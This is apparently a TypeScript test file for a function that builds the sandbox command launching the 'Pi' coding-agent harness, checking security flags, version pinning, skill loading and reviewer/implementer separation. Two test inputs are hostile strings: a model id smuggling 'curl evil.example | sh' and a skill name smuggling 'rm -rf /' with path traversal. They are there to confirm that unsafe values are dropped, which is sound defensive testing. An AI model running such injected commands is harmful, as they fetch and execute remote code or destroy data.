import { PI_PACKAGE } from '@vantikhq/types';

import {
  BUNDLED_SKILLS,
  IMPLEMENTER_SKILLS,
  REVIEWER_SKILLS,
  skillArguments,
  skillFiles,
} from '../agent-skills';
import { piCommand } from './hosted.executor';

/**
 * The harness invocation the sandbox runs.
 *
 * This string reaches a shell, and part of it comes from whoever delegated, so
 * the tests that matter here are about what cannot get into it.
 */
describe('the bundled harness command', () => {
  it('always carries the flags that are security controls', () => {
    const command = piCommand({ provider: 'anthropic' });

    // Pi otherwise auto-discovers extensions from `.pi/extensions/*.ts` in the
    // project directory and runs them with full access — a code-execution path
    // controlled by anyone who can land a file in the repository.
    expect(command).toContain('--no-extensions');
    // Nothing is present to approve a tool call, and a harness blocked on a
    // prompt burns its lease waiting.
    expect(command).toContain('--no-approve');
  });

  it('runs the mode that takes a prompt and then exits', () => {
    // Not `rpc`. RPC is a server: it answers prompts sent as JSONL commands on
    // stdin and waits for the next one, so it never exits on its own — and the
    // sandbox has exactly one command and reads the result afterwards. The
    // executor used to run RPC and redirect the context pack into it, which
    // sent Pi no prompt at all, so every hosted run did nothing and reported
    // that it had changed nothing.
    expect(piCommand({})).toContain('--mode json');
    expect(piCommand({})).not.toContain('--mode rpc');
  });

  it('pins the package rather than floating to whatever is latest', () => {
    // The run records the harness version so two runs can be compared. An
    // unpinned package makes that record a guess.
    expect(piCommand({})).toContain(PI_PACKAGE);
    expect(piCommand({})).toContain('@');
  });

  it('passes the model choice through', () => {
    expect(
      piCommand({
        provider: 'anthropic',
        model: 'claude-opus-4-5',
        thinking: 'high',
      }),
    ).toContain('--provider anthropic --model claude-opus-4-5 --thinking high');
  });

  it('drops a model id that is not safe to put in a command line', () => {
    // Refused rather than escaped: a quoting bug here is command execution in
    // the sandbox, and no legitimate model id looks like this.
    const command = piCommand({ model: 'gpt-5; curl evil.example | sh' });

    expect(command).not.toContain('curl');
    expect(command).not.toContain(';');
    expect(command).not.toContain('--model');
  });

  it('drops a thinking level Pi does not know', () => {
    // Pi rejects an unknown level and exits, so a typo in a settings field
    // would otherwise kill every run in the workspace.
    expect(piCommand({ thinking: 'very-hard' })).not.toContain('--thinking');
    expect(piCommand({ thinking: 'max' })).toContain('--thinking max');
  });

  it('leaves out what was not chosen', () => {
    const command = piCommand({});

    expect(command).not.toContain('--model');
    expect(command).not.toContain('--thinking');
    expect(command).not.toContain('--provider');
  });
});

describe('the skills a run is given', () => {
  it('loads each one explicitly, because discovery is off', () => {
    // `--no-skills` stops Pi reading skills out of the checkout, where they
    // would be instructions written by whoever can land a file in the
    // repository. `--skill` stays additive under that flag, which is what lets
    // the two be used together.
    const command = piCommand({
      skills: [
        '/workspace/skills/vantik-issues',
        '/workspace/skills/writing-code',
      ],
    });

    expect(command).toContain('--no-skills');
    expect(command).toContain('--skill /workspace/skills/vantik-issues');
    expect(command).toContain('--skill /workspace/skills/writing-code');
  });

  it('names no skill when none was given', () => {
    expect(piCommand({})).not.toContain('--skill ');
  });
});

describe('the bundled skills', () => {
  it('ships one about the issue, one about the code, one about reviewing', () => {
    expect(BUNDLED_SKILLS.map((skill) => skill.name).sort()).toEqual([
      'reviewing-work',
      'vantik-issues',
      'writing-code',
    ]);
  });

  it('seeds each as a SKILL.md in its own directory', () => {
    // The Agent Skills layout Pi implements, which is also the one Claude Code
    // reads — so a workspace's own skills can join these without a second
    // format.
    const files = skillFiles();

    expect(Object.keys(files).sort()).toEqual([
      'skills/reviewing-work/SKILL.md',
      'skills/vantik-issues/SKILL.md',
      'skills/writing-code/SKILL.md',
    ]);
  });

  it('never gives the implementer the skill about reviewing', () => {
    // The whole value of the review pass is that it is made by something which
    // did not write the code. An implementer told how to review starts grading
    // its own diff, and its verdict on itself is worth nothing.
    expect(IMPLEMENTER_SKILLS.map((skill) => skill.name)).not.toContain(
      'reviewing-work',
    );
    expect(skillArguments(IMPLEMENTER_SKILLS)).toEqual([
      '/workspace/skills/vantik-issues',
      '/workspace/skills/writing-code',
    ]);
  });

  it('never gives the reviewer the skill about writing changes', () => {
    // `writing-code` is instructions for making a change, which is the one
    // thing a reviewer must not do.
    expect(REVIEWER_SKILLS.map((skill) => skill.name)).not.toContain(
      'writing-code',
    );
    expect(skillArguments(REVIEWER_SKILLS)).toEqual([
      '/workspace/skills/vantik-issues',
      '/workspace/skills/reviewing-work',
    ]);
  });

  it('tells the reviewer not to fix what it finds', () => {
    // A reviewer that fixes what it finds has destroyed the independent read
    // and produced work nobody has reviewed.
    const reviewing = BUNDLED_SKILLS.find(
      (skill) => skill.name === 'reviewing-work',
    );

    expect(reviewing?.body).toContain('Do not fix anything');
    expect(reviewing?.body).toContain('Every finding needs evidence');
  });

  it('gives every skill the frontmatter the standard requires', () => {
    // Pi warns rather than refuses on most violations, so a missing
    // description would silently cost the skill its chance to be loaded: the
    // description is what the agent decides on.
    for (const skill of BUNDLED_SKILLS) {
      expect(skill.body).toMatch(
        new RegExp(`^---\\nname: ${skill.name}\\ndescription: .{20,}`),
      );
      expect(skill.name).toMatch(/^[a-z0-9]+(-[a-z0-9]+)*$/);
    }
  });

  it('drops a skill whose name could not go on a command line safely', () => {
    // These are constants today, so nothing should ever fail this — which is
    // exactly why it is cheap to keep for the day a workspace adds its own.
    expect(
      skillArguments([
        { name: 'fine', body: '' },
        { name: '../../etc; rm -rf /', body: '' },
      ]),
    ).toEqual(['/workspace/skills/fine']);
  });

  it('tells the agent the Definition of Done is the bar, not a hint', () => {
    // The one instruction this whole feature turns on. If it ever stops saying
    // so, a run will happily deliver something adjacent to what was asked.
    const issues = BUNDLED_SKILLS.find(
      (skill) => skill.name === 'vantik-issues',
    );

    expect(issues?.body).toContain('Satisfy every item');
    expect(issues?.body).toContain('Do not reinterpret');
  });

  it('tells the agent to watch its test fail first', () => {
    const code = BUNDLED_SKILLS.find((skill) => skill.name === 'writing-code');

    expect(code?.body).toContain('Watch it fail');
    expect(code?.body).toContain('fix the cause rather than the check');
  });
});
